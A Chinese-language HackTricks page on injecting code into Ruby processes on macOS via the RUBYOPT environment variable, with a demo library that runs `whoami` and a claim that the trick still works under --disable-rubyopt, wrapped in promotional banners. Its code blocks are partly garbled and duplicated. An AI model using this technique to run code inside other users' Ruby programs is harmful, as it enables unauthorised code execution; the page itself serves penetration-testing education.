# macOS Ruby 应用程序注入

<details>

<summary><strong>从零开始学习 AWS 黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

其他支持 HackTricks 的方式：

* 如果你想在 **HackTricks** 中看到你的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享你的黑客技巧**。

</details>

## RUBYOPT

使用这个环境变量可以在每次执行 **ruby** 时**添加新的参数**。虽然不能使用参数 **`-e`** 来指定要执行的 ruby 代码，但可以使用参数 **`-I`** 和 **`-r`** 来添加一个新的文件夹到库加载路径，然后**指定一个要加载的库**。

在 **`/tmp`** 中创建库 **`inject.rb`**：

{% code title="inject.rb" %}
```ruby
puts `whoami`
```
```ruby
# hello.rb 内容
puts "Hello, world!"
```
{% endcode %}

创建一个 Ruby 脚本，例如：

{% code title="hello.rb" %}
```ruby
puts "Hello, world!"
```
{% endcode %}
```ruby
puts 'Hello, World!'
```
```markdown
然后使用以下命令加载一个任意的ruby脚本：
```
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
趣事，即使使用参数 **`--disable-rubyopt`** 也能工作：
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
